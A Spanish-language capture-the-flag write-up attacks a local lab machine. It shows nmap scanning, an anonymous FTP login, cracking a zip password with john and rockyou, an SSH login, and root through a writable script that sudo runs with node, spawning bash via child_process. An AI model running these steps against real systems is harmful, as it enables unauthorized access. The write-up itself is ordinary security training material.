## Escaneo
Realizo escaneo en busqueda de puertoss abiertos
```
nmap -p- --open --min-rate 4000 -n -sS -Pn 172.17.0.2 -oG puertos
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 10:46 -0400
Nmap scan report for 172.17.0.2
Host is up (0.0000060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
```
Encuentro que los puertos **21 y 22** se encuentran abiertos. Realizo un escaneo mas detallado en busqueda de servicios y versiones
```
nmap -p21,22 -sCV 172.17.0.2 -oN escaneo
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-30 10:47 -0400
Nmap scan report for 172.17.0.2
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 cd:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae (ECDSA)
|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 (ED25519)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```
 En el escaneo se observa que el puerto 21 de ftp se encuentra abierto y permite login a travez de el usuario **anonymous** sin contraseña

## Explotacion
Ingreso al servicio de ftp con el usuario anonymous y descubro un archivo .zip lo descargo para observar su contenido.
```
ftp 172.17.0.2
Connected to 172.17.0.2.
220 (vsFTPd 3.0.3)
Name (172.17.0.2:kali): anonymous     
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||48688|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
226 Directory send OK.
ftp> get secretitopicaron.zip
local: secretitopicaron.zip remote: secretitopicaron.zip
229 Entering Extended Passive Mode (|||46352|)
150 Opening BINARY mode data connection for secretitopicaron.zip (242 bytes).
100% |*********************************************************************************************************************************************|   242        7.95 MiB/s    00:00 ETA
226 Transfer complete.
```
Al tratar de descomprimir el archivo me solicita contraseña, realizo fuerza bruta para poder conseguir la contraseña.
```
❯ unzip secretitopicaron.zip
Archive:  secretitopicaron.zip
[secretitopicaron.zip] password.txt password: 
   skipping: password.txt            incorrect password
❯ zip2john secretitopicaron.zip > hash.txt
Created directory: /home/kali/.john
ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=52, decmplen=40, crc=59D5D024 ts=4C03 cs=4c03 type=0
❯ ls
 escaneo   hash.txt   puertos   secretitopicaron.zip
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (secretitopicaron.zip/password.txt)     
1g 0:00:00:00 DONE (2026-03-30 11:07) 33.33g/s 341333p/s 341333c/s 341333C/s 123456..1asshole
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Al conseguir la contraseña descomprimo el archivo, consigo un archivo password.txt veo su contenido y obtengo un usuario y contraseña
```
❯ cat password.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: password.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ mario:laKontraseñAmasmalotaHdelbarrioH
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Ya con el usuario y contraseña ingreso a travez de ssh.
```
❯ ssh mario@172.17.0.2
mario@646f3a51ec65:~$ id uid=1000(mario) gid=1000(mario) groups=1000(mario),100(users)
```
## Escalada de privilegio
Realizo busqueda de sudo en busqueda de vlnerabilidades.
```
mario@646f3a51ec65:~$ sudo -l Matching Defaults entries for mario on 646f3a51ec65: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty User mario may run the following commands on 646f3a51ec65: (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```
Esto me indica que el usuario mario puede ejecutar node como root pero solamente con un script espacifico.
Para poder escalar privilegios verifico los permisos de **script.js** y observo que tengo permisos de escritura asi que lo modifico para poder ejecutarlo como root.
```
mario@646f3a51ec65:~$ ls -l /home/mario/script.js 
-rw-r--r-- 1 mario mario 0 Jul 5 2024 /home/mario/script.js
```

```
mario@646f3a51ec65:~$ nano /home/mario/script.js Error opening terminal: xterm-kitty.
```
Al querer modificarlo me da error porque utilizo una terminal kitty y la maquina no soporta el tipo, asi que utilizo el comando *echo*
```
echo "require('child_process').execSync('/bin/bash', {stdio: 'inherit'});" > /home/mario/script.js
```
Una vez modificado el script lo ejecuto para poder ser root
```
mario@646f3a51ec65:~$ sudo /usr/bin/node /home/mario/script.js root@646f3a51ec65:/home/mario# id uid=0(root) gid=0(root) groups=0(root)
```
